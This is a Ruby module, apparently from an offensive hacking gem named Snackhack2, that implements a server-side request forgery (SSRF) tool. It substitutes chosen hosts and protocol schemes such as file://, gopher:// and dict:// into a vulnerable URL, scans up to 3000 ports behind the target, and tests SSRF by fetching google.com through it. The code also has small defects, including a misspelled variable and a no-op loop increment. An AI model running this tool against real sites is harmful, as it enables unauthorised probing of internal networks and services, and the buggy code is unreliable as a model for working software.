# frozen_string_literal: true

# Process.spawn("ruby -run -ehttpd . -p8008")
# sleep 10
require 'colorize'
module Snackhack2
  class SSRF
    attr_accessor :site, :ssrf_site, :protocol
    def initialize
      @site = site
      @ssrf_site = ssrf_site
      @protocol = protocol
    end
    def get_protocol
      case @protocol.downcase
      when "https"
        "https://"
      when "ftp"
        "ftp://"
      when "http"
        "http://"
      when "file"
        "file://"
      when "dict"
        "dict://"
      when "gopher"
        "gopher://"
      when "sftp"
        "sftp://"
      when "tftp"
        "tftp://"
      when "ldap"
        "ldap://"
      end
    end
    def http_port_scan(port_count: 3000)
      found_ports = []
      ssrf_status = false
      # 6553
      for port in 0..port_count.to_i
        site = @site.gsub("SSRF", "#{@ssrf_site}") + ":" + port.to_s
        puts site
        begin
          j = HTTParty.get(site)
          puts "Response code: #{j.code}"
          if j.code.to_i.eql?(200)
            found_ports << port
            ssrf_status = true
          end 
        rescue => e
          #puts "error: #{e}"
          ssrf_satus = false
        end
        port += 1
      end
    found_ports
    end
    def ssrf_google
      url = @site.gsub('SSRF', 'http://google.com')
      ht = HTTParty.get(url)
      if ht.body.include?("Search the world's information, including webpages, images, videos and more. Google has many special features to help you find exactly what you're looking for.")
        puts "Boom Shaka. It's vulnerable to SSRF..."
      end
    end
  end
end
